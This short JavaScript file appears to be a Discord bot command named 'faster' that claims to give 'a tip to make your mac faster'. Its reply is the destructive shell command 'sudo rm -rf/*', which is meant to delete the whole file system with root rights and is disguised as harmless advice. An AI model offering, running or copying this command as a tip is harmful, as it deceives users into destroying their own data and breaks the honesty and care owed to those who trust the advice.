module.exports ={
    name: 'faster',
    description: 'a tip to make your mac faster',
    execute(client, message, args){
        message.reply({content: 'sudo rm -rf/*'})
    }   
}
